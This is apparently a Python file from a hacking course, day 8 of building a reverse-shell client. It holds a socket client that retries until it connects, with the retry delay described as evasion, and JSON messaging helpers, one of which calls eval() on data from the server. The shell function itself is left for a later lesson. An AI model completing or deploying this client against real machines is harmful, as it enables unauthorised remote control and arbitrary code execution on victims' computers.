# Day 8 - The Json Module

import socket
import json
import time # 12

def ip_address():
    global server_ip
    serv_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv_ip.connect(("8.8.8.8", 80))
    server_ip = serv_ip.getsockname()[0]
    serv_ip.close()
    return server_ip

########################

server_ip = ip_address() 
server_port = 5555

########################



def json_send(data):
    jsondata = json.dumps(data)
    client.send(jsondata.encode())

def json_recv(size=1024):
    data = ''
    while True:
        try:
            data += client.recv(size).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def message_send(string, size=8):
    no_str = False
    if type(string) != str:
        string =str(string)
        no_str = True
    body = string.encode()
    length = len(body)
    header = str(length).encode()
    header += b' ' * (size - len(header))
    client.send(header)
    client.send(body)
    if no_str == True:
        client.send('T'.encode())
    else:
        client.send('F'.encode())

def message_recv(size=8):
    while True:
        header = client.recv(size).decode()
        if header:
            body_size = int(header)
            body = client.recv(body_size).decode()
            no_str = client.recv(1).decode()
            break
    if no_str == 'T':
        body = eval(body)
    return body


def connection(): # 11
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    while True:
        time.sleep(0) # 12
        try:
            client.connect((server_ip, server_port))
            shell() # 14
            client.close()
            break
        except: # 13
            connection()

connection()

# testing


########################
# 11    Renamed and also added a while loop; so that it will always initiate to connect to the server.
# 12    I also added time.sleep(0) which we are going to make 1-10 seconds in the future to avoid unnecessary errors
#       and to delay the connection to the server (evasion)
#       also imported a new module, time
#       it will always try to connect to the server and if it has an error...
# 13    It will try again to connect. similarly to the json_recv that we did.
# 14    If it successfully connected to the server, We are now going to the shell fucntion which is not existed yet.
#       This the most exciting part of the course, we are going to make a shell on our next topic. and we will use json functions that we did.

########################


# pwning tmrw!